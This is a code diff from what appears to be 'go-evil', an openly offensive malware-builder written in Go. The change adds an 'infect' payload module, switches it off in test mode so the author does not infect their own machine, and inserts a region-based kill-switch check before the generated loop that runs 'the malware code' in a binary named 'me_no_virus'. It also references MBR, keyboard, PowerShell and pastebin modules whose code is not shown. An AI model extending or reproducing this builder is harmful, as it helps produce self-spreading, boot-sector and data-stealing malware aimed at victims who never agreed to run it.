@@ -34,6 +34,7 @@ const (
 	pwsh           = "\tpwsh \"github.com/s9rA16Bf4/go-evil/domains/powershell/private\""
 	pastebin       = "\tpastebin \"github.com/s9rA16Bf4/go-evil/domains/pastebin/private\""
 	mbr            = "\tmbr \"github.com/s9rA16Bf4/go-evil/domains/mbr/private\""
+	infect         = "\tinfect \"github.com/s9rA16Bf4/go-evil/domains/infect/private\""
 
 	// Related to webview
 	loader_x86 = "https://github.com/webview/webview/raw/master/dll/x86/WebView2Loader.dll"
@@ -105,6 +106,11 @@ func Append_domain(domain string) {
 			notify.Log("Adding library 'MBR'", notify.Verbose_lvl, "2")
 			domains = append(domains, mbr)
 		}
+	case "infect":
+		if !find(infect) && !mal.Is_disabled("infect") {
+			notify.Log("Adding library 'infect'", notify.Verbose_lvl, "2")
+			domains = append(domains, infect)
+		}
 	}
 }
 
@@ -132,6 +138,7 @@ func Set_testMode(new_mode bool) {
 		mal.Disable_domain("keyboard") // Keyboard
 		mal.Disable_domain("pastebin") // pastebin
 		mal.Disable_domain("mbr")      // Master boot record
+		mal.Disable_domain("infect")   // We don't wanna infect ourself
 	}
 }
 
@@ -148,12 +155,14 @@ func Write_file() {
 	base_code := []string{
 		"package main",
 		"import (",
+		"\"github.com/cloudfoundry/jibber_jabber\"",
 	}
-	base_code = append(base_code, domains...)            // Which domains to include
-	base_code = append(base_code, ")", "func main(){")   // Main function and closing include tag
-	base_code = append(base_code, "for "+test_mode+" {") // While loop
-	base_code = append(base_code, mal.GetContent()...)   // Insert the malware code
-	base_code = append(base_code, "}}")                  // And insert the end
+	base_code = append(base_code, domains...)                  // Which domains to include
+	base_code = append(base_code, ")", "func main(){")         // Main function and closing include tag
+	base_code = append(base_code, mal.Region_is_disabled()...) // Will stop the malware from running if it has been told too
+	base_code = append(base_code, "for "+test_mode+" {")       // While loop
+	base_code = append(base_code, mal.GetContent()...)         // Insert the malware code
+	base_code = append(base_code, "}}")                        // And insert the end
 
 	if mal.GetName() == "" {
 		mal.SetBinaryName("me_no_virus")
